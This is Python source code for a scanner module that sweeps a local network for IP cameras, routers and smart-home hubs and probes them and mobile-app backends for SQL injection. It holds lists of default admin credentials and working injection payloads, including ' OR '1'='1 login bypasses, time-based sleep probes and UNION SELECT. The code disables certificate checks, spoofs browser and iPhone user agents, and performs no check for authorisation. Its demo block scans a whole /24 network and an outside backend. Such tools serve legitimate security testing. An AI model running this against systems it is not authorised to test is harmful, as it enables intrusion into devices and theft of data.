#!/usr/bin/env python3
# IoT and Mobile Scanner Module
# Extends SQL injection scanning capabilities to IoT devices and mobile applications

import os
import re
import json
import logging
import requests
import socket
import struct
import ipaddress
from urllib.parse import urlparse
import hashlib
import time
from datetime import datetime

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('iot_mobile_scanner')

class IoTMobileScanner:
    """
    Scanner for IoT devices and mobile applications to detect SQL injection vulnerabilities
    """
    def __init__(self, config=None):
        """Initialize scanner with configuration"""
        self.config = config or {}
        self.scan_results = {}
        self.api_endpoints = []
        self.discovered_devices = []
        self.data_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
        os.makedirs(self.data_dir, exist_ok=True)
        
        # Load device fingerprints
        self.device_fingerprints = self._load_device_fingerprints()
        
        # Load common API patterns
        self.api_patterns = self._load_api_patterns()
        
        logger.info("IoT and Mobile Scanner initialized")
        
    def _load_device_fingerprints(self):
        """Load known IoT device fingerprints"""
        fingerprints_file = os.path.join(self.data_dir, 'iot_fingerprints.json')
        
        # Create default fingerprints if file doesn't exist
        if not os.path.exists(fingerprints_file):
            fingerprints = {
                "devices": [
                    {
                        "name": "IP Camera",
                        "ports": [80, 443, 554, 8080, 8081, 9000],
                        "patterns": [
                            "ipcamera", "webcam", "netcam", "camera",
                            "login.cgi", "view.cgi", "streaming.cgi"
                        ],
                        "auth_paths": ["/login.cgi", "/cgi-bin/login.cgi", "/admin/login.php"],
                        "default_creds": [
                            {"username": "admin", "password": "admin"},
                            {"username": "admin", "password": "password"},
                            {"username": "admin", "password": ""}
                        ]
                    },
                    {
                        "name": "Router",
                        "ports": [80, 443, 8080, 8443],
                        "patterns": [
                            "router", "gateway", "ap", "linksys", "netgear", "tp-link",
                            "d-link", "asus", "admin", "setup.cgi"
                        ],
                        "auth_paths": ["/login.cgi", "/cgi-bin/login.cgi", "/admin/login.php"],
                        "default_creds": [
                            {"username": "admin", "password": "admin"},
                            {"username": "admin", "password": "password"},
                            {"username": "admin", "password": ""}
                        ]
                    },
                    {
                        "name": "Smart Home Hub",
                        "ports": [80, 443, 8080, 8081, 1883, 8883],
                        "patterns": [
                            "hub", "smarthome", "automation", "iot",
                            "smart", "zigbee", "zwave"
                        ],
                        "auth_paths": ["/api/login", "/login", "/auth"],
                        "default_creds": [
                            {"username": "admin", "password": "admin"},
                            {"username": "admin", "password": "password"},
                            {"username": "admin", "password": "smartthings"}
                        ]
                    }
                ],
                "mobile_api_patterns": [
                    "/api/v1/", "/api/v2/", "/api/", "/app/", "/mobile/"
                ]
            }
            
            # Save default fingerprints
            with open(fingerprints_file, 'w') as f:
                json.dump(fingerprints, f, indent=2)
            
        else:
            # Load existing fingerprints
            with open(fingerprints_file, 'r') as f:
                fingerprints = json.load(f)
                
        return fingerprints
        
    def _load_api_patterns(self):
        """Load common API patterns for mobile applications"""
        return [
            {
                "name": "REST API Endpoint",
                "patterns": [
                    r"/api/v\d+/\w+",
                    r"/api/\w+",
                    r"/rest/\w+",
                    r"/service/\w+"
                ],
                "methods": ["GET", "POST", "PUT", "DELETE"],
                "parameters": ["id", "user_id", "device_id", "query", "filter"]
            },
            {
                "name": "GraphQL Endpoint",
                "patterns": [
                    r"/graphql",
                    r"/gql",
                    r"/api/graphql"
                ],
                "methods": ["POST"],
                "parameters": ["query", "variables", "operationName"]
            },
            {
                "name": "Authentication Endpoint",
                "patterns": [
                    r"/auth/\w+",
                    r"/login",
                    r"/api/login",
                    r"/api/auth"
                ],
                "methods": ["POST"],
                "parameters": ["username", "password", "email", "token"]
            },
            {
                "name": "User Data Endpoint",
                "patterns": [
                    r"/api/users?/\w*",
                    r"/api/accounts?/\w*",
                    r"/api/profiles?/\w*"
                ],
                "methods": ["GET", "POST", "PUT"],
                "parameters": ["id", "user_id", "username", "email"]
            }
        ]
    
    def discover_network_devices(self, network="192.168.1.0/24", ports=[80, 443, 8080, 8443]):
        """Discover IoT devices on the local network"""
        logger.info(f"Scanning network {network} for IoT devices...")
        discovered = []
        
        try:
            network_addr = ipaddress.ip_network(network)
            
            for ip in network_addr.hosts():
                ip_str = str(ip)
                
                # Check common IoT ports
                for port in ports:
                    try:
                        # Create socket with timeout
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.5)
                        
                        # Attempt to connect
                        result = s.connect_ex((ip_str, port))
                        
                        if result == 0:
                            device = {
                                "ip": ip_str,
                                "port": port,
                                "status": "open",
                                "timestamp": datetime.now().isoformat()
                            }
                            
                            # Try to get banner
                            try:
                                if port in [80, 443, 8080, 8443]:
                                    protocol = "https" if port in [443, 8443] else "http"
                                    url = f"{protocol}://{ip_str}:{port}"
                                    
                                    headers = {
                                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                                    }
                                    
                                    response = requests.get(url, timeout=2, headers=headers, verify=False)
                                    
                                    # Store response details
                                    device["status_code"] = response.status_code
                                    device["headers"] = dict(response.headers)
                                    device["title"] = self._extract_title(response.text)
                                    device["device_type"] = self._identify_device_type(response.text, ip_str, port)
                                    
                                    # Check if device appears to be an IoT device
                                    if device["device_type"]:
                                        discovered.append(device)
                                        logger.info(f"Discovered {device['device_type']} at {ip_str}:{port}")
                            except Exception as e:
                                logger.debug(f"Error getting banner for {ip_str}:{port}: {e}")
                                
                        s.close()
                        
                    except socket.error:
                        pass
                        
        except Exception as e:
            logger.error(f"Error discovering network devices: {e}")
            
        self.discovered_devices = discovered
        return discovered
        
    def _extract_title(self, html_content):
        """Extract title from HTML content"""
        title_match = re.search(r"<title>([^<]+)</title>", html_content, re.IGNORECASE)
        if title_match:
            return title_match.group(1).strip()
        return None
        
    def _identify_device_type(self, html_content, ip, port):
        """Identify device type based on HTML content"""
        for device in self.device_fingerprints["devices"]:
            for pattern in device["patterns"]:
                if pattern.lower() in html_content.lower():
                    return device["name"]
                    
        return None
        
    def discover_api_endpoints(self, base_url, max_paths=50):
        """Discover API endpoints from a mobile application backend"""
        logger.info(f"Discovering API endpoints for {base_url}...")
        discovered_apis = []
        
        # Parse base URL
        parsed_url = urlparse(base_url)
        base_scheme = parsed_url.scheme
        base_netloc = parsed_url.netloc
        
        # Common API path patterns for mobile apps
        api_paths = [
            "/api", "/api/v1", "/api/v2", "/app", "/mobile", 
            "/auth", "/login", "/user", "/data", "/device"
        ]
        
        # Add patterns from loaded configuration
        api_paths.extend(self.device_fingerprints.get("mobile_api_patterns", []))
        
        for path in api_paths:
            api_url = f"{base_scheme}://{base_netloc}{path}"
            
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
                    "Accept": "application/json, text/plain, */*"
                }
                
                response = requests.get(api_url, headers=headers, timeout=5, verify=False)
                
                # Check if response is valid JSON
                is_json = False
                try:
                    json_content = response.json()
                    is_json = True
                except:
                    is_json = False
                    
                # Store API endpoint details
                endpoint = {
                    "url": api_url,
                    "method": "GET",
                    "status_code": response.status_code,
                    "content_type": response.headers.get("Content-Type", ""),
                    "is_json": is_json,
                    "timestamp": datetime.now().isoformat()
                }
                
                # If endpoint seems to be valid API
                if response.status_code < 400 or is_json:
                    discovered_apis.append(endpoint)
                    logger.info(f"Discovered API endpoint: {api_url} ({response.status_code})")
                    
                    # Try to identify parameters
                    if is_json:
                        endpoint["parameters"] = self._extract_potential_parameters(json_content)
                        
            except Exception as e:
                logger.debug(f"Error checking API endpoint {api_url}: {e}")
                
        # Sort by status code (successful first)
        discovered_apis.sort(key=lambda x: x["status_code"])
        
        # Limit to max_paths
        self.api_endpoints = discovered_apis[:max_paths]
        return self.api_endpoints
    
    def _extract_potential_parameters(self, json_data, prefix=""):
        """Extract potential parameters from JSON data"""
        params = []
        
        if isinstance(json_data, dict):
            for key, value in json_data.items():
                param_path = f"{prefix}.{key}" if prefix else key
                
                # Check if key looks like an injectable parameter
                if any(p in key.lower() for p in ["id", "user", "name", "query", "filter", "search"]):
                    params.append({
                        "name": param_path,
                        "type": type(value).__name__,
                        "example": str(value)[:50] if value is not None else None,
                        "injectable": True
                    })
                else:
                    params.append({
                        "name": param_path,
                        "type": type(value).__name__,
                        "example": str(value)[:50] if value is not None else None,
                        "injectable": False
                    })
                    
                # Recursively process nested objects
                if isinstance(value, (dict, list)):
                    params.extend(self._extract_potential_parameters(value, param_path))
                    
        elif isinstance(json_data, list) and len(json_data) > 0:
            # Process first item in the list as example
            sample = json_data[0]
            params.extend(self._extract_potential_parameters(sample, f"{prefix}[0]"))
            
        return params
    
    def scan_device(self, ip, port, device_type=None):
        """Scan an IoT device for SQL injection vulnerabilities"""
        logger.info(f"Scanning device at {ip}:{port}...")
        
        vulnerabilities = []
        protocol = "https" if port in [443, 8443] else "http"
        base_url = f"{protocol}://{ip}:{port}"
        
        # Get device fingerprint if available
        device_fingerprint = None
        if device_type:
            device_fingerprint = next((d for d in self.device_fingerprints["devices"] if d["name"] == device_type), None)
        
        # Try default credentials if available
        if device_fingerprint and "auth_paths" in device_fingerprint:
            for auth_path in device_fingerprint["auth_paths"]:
                auth_url = f"{base_url}{auth_path}"
                
                for creds in device_fingerprint.get("default_creds", []):
                    try:
                        # Prepare login data
                        data = {
                            "username": creds["username"],
                            "password": creds["password"]
                        }
                        
                        # Try SQL injection in login form
                        for param in ["username", "password"]:
                            sqli_value = "' OR '1'='1"
                            test_data = data.copy()
                            test_data[param] = sqli_value
                            
                            response = requests.post(auth_url, data=test_data, timeout=5, verify=False)
                            
                            # Check if login was successful
                            if "login" not in response.url.lower() and response.status_code == 200:
                                vulnerabilities.append({
                                    "type": "Authentication Bypass",
                                    "url": auth_url,
                                    "parameter": param,
                                    "payload": sqli_value,
                                    "severity": "High",
                                    "details": f"SQL injection in login form parameter: {param}"
                                })
                                logger.warning(f"Found authentication bypass vulnerability at {auth_url}")
                                
                    except Exception as e:
                        logger.debug(f"Error testing auth endpoint {auth_url}: {e}")
                        
        # Scan common URL patterns
        common_patterns = [
            "/cgi-bin/param.cgi?cmd=getuser&user=admin",
            "/cgi-bin/device.cgi?id=1",
            "/api/user?id=1",
            "/app/device?id=1",
            "/data?device_id=1"
        ]
        
        for pattern in common_patterns:
            url = f"{base_url}{pattern}"
            
            try:
                # Test with SQL injection payloads
                payloads = ["'", "1'", "1' OR '1'='1", "1' AND sleep(5)--"]
                
                for payload in payloads:
                    # Extract parameter name
                    param_match = re.search(r"([^=&]+)=([^&]+)", pattern)
                    if param_match:
                        param_name = param_match.group(1)
                        param_value = param_match.group(2)
                        
                        # Replace parameter value with payload
                        test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={payload}")
                        
                        start_time = time.time()
                        response = requests.get(test_url, timeout=10, verify=False)
                        response_time = time.time() - start_time
                        
                        # Check for SQL errors in response
                        error_patterns = [
                            "SQL syntax", "mysql_fetch", "ORA-", 
                            "Microsoft SQL Server", "PostgreSQL", "SQLite"
                        ]
                        
                        for error in error_patterns:
                            if error.lower() in response.text.lower():
                                vulnerabilities.append({
                                    "type": "SQL Injection",
                                    "url": test_url,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "severity": "High",
                                    "details": f"SQL error detected in response: {error}"
                                })
                                logger.warning(f"Found SQL injection vulnerability at {test_url}")
                                break
                                
                        # Check for time-based injection
                        if "sleep" in payload.lower() and response_time > 5:
                            vulnerabilities.append({
                                "type": "Time-based SQL Injection",
                                "url": test_url,
                                "parameter": param_name,
                                "payload": payload,
                                "severity": "Medium",
                                "details": f"Time-based SQL injection detected (response time: {response_time:.2f}s)"
                            })
                            logger.warning(f"Found time-based SQL injection vulnerability at {test_url}")
                            
            except Exception as e:
                logger.debug(f"Error testing endpoint {url}: {e}")
                
        return vulnerabilities
    
    def scan_api_endpoint(self, endpoint):
        """Scan a mobile API endpoint for SQL injection vulnerabilities"""
        logger.info(f"Scanning API endpoint: {endpoint['url']}")
        
        vulnerabilities = []
        
        # Parse URL and extract parameters
        parsed_url = urlparse(endpoint["url"])
        query_params = {}
        
        # Extract query parameters if present
        if parsed_url.query:
            for pair in parsed_url.query.split("&"):
                if "=" in pair:
                    key, value = pair.split("=", 1)
                    query_params[key] = value
                    
        # If no query parameters, check if parameters were previously identified
        if not query_params and "parameters" in endpoint:
            for param in endpoint["parameters"]:
                if param.get("injectable", False):
                    query_params[param["name"]] = "1"
                    
        # If still no parameters, try common ones
        if not query_params:
            query_params = {
                "id": "1",
                "user_id": "1",
                "device_id": "1",
                "query": "test"
            }
            
        # Test each parameter
        for param_name, param_value in query_params.items():
            # Basic SQL injection payloads
            payloads = [
                "1'", 
                "1' OR '1'='1", 
                "1' AND sleep(3)--", 
                "1' UNION SELECT 1,2,3--",
                "1') OR ('1'='1"
            ]
            
            for payload in payloads:
                # Create test URL with payload
                test_params = query_params.copy()
                test_params[param_name] = payload
                
                # Build query string
                query_string = "&".join([f"{k}={v}" for k, v in test_params.items()])
                
                # Create test URL
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                if query_string:
                    test_url += f"?{query_string}"
                    
                try:
                    # Send request
                    start_time = time.time()
                    response = requests.get(test_url, timeout=10, verify=False)
                    response_time = time.time() - start_time
                    
                    # Check for SQL errors in response
                    error_patterns = [
                        "SQL syntax", "mysql_fetch", "ORA-", 
                        "Microsoft SQL Server", "PostgreSQL", "SQLite"
                    ]
                    
                    for error in error_patterns:
                        if error.lower() in response.text.lower():
                            vulnerabilities.append({
                                "type": "SQL Injection",
                                "url": test_url,
                                "parameter": param_name,
                                "payload": payload,
                                "severity": "High",
                                "details": f"SQL error detected in response: {error}"
                            })
                            logger.warning(f"Found SQL injection vulnerability at {test_url}")
                            break
                            
                    # Check for time-based injection
                    if "sleep" in payload.lower() and response_time > 3:
                        vulnerabilities.append({
                            "type": "Time-based SQL Injection",
                            "url": test_url,
                            "parameter": param_name,
                            "payload": payload,
                            "severity": "Medium",
                            "details": f"Time-based SQL injection detected (response time: {response_time:.2f}s)"
                        })
                        logger.warning(f"Found time-based SQL injection vulnerability at {test_url}")
                        
                except Exception as e:
                    logger.debug(f"Error testing endpoint {test_url}: {e}")
                    
        return vulnerabilities
    
    def scan_mobile_app_backend(self, base_url):
        """Scan a mobile application backend for SQL injection vulnerabilities"""
        logger.info(f"Scanning mobile app backend: {base_url}")
        
        # Step 1: Discover API endpoints
        endpoints = self.discover_api_endpoints(base_url)
        
        if not endpoints:
            logger.warning(f"No API endpoints discovered for {base_url}")
            return []
            
        # Step 2: Scan each endpoint
        all_vulnerabilities = []
        
        for endpoint in endpoints:
            vulnerabilities = self.scan_api_endpoint(endpoint)
            all_vulnerabilities.extend(vulnerabilities)
            
        logger.info(f"Found {len(all_vulnerabilities)} vulnerabilities in {base_url}")
        return all_vulnerabilities
    
    def scan_all_discovered_devices(self):
        """Scan all discovered devices for SQL injection vulnerabilities"""
        logger.info(f"Scanning all {len(self.discovered_devices)} discovered devices")
        
        all_results = {}
        
        for device in self.discovered_devices:
            ip = device["ip"]
            port = device["port"]
            device_type = device.get("device_type")
            
            vulnerabilities = self.scan_device(ip, port, device_type)
            
            device_key = f"{ip}:{port}"
            all_results[device_key] = {
                "device": device,
                "vulnerabilities": vulnerabilities
            }
            
        self.scan_results = all_results
        return all_results
        
    def generate_report(self, output_file=None):
        """Generate a report of found vulnerabilities"""
        if not output_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = os.path.join(self.data_dir, f"iot_mobile_scan_report_{timestamp}.json")
            
        report = {
            "scan_date": datetime.now().isoformat(),
            "devices_scanned": len(self.scan_results),
            "total_vulnerabilities": sum(len(r["vulnerabilities"]) for r in self.scan_results.values()),
            "results": self.scan_results
        }
        
        with open(output_file, "w") as f:
            json.dump(report, f, indent=2)
            
        logger.info(f"Report saved to {output_file}")
        return output_file

if __name__ == "__main__":
    # Disable SSL warnings
    requests.packages.urllib3.disable_warnings()
    
    # Simple test/demo
    scanner = IoTMobileScanner()
    
    # Example: Scan local network
    print("Discovering devices on local network...")
    devices = scanner.discover_network_devices("192.168.1.0/24")
    print(f"Discovered {len(devices)} devices")
    
    if devices:
        # Scan all discovered devices
        results = scanner.scan_all_discovered_devices()
        scanner.generate_report()
        
    # Example: Scan a mobile app backend
    print("\nScanning a mobile app backend...")
    backend_url = "https://mobile-api-example.com"
    vulnerabilities = scanner.scan_mobile_app_backend(backend_url)
    print(f"Found {len(vulnerabilities)} vulnerabilities")
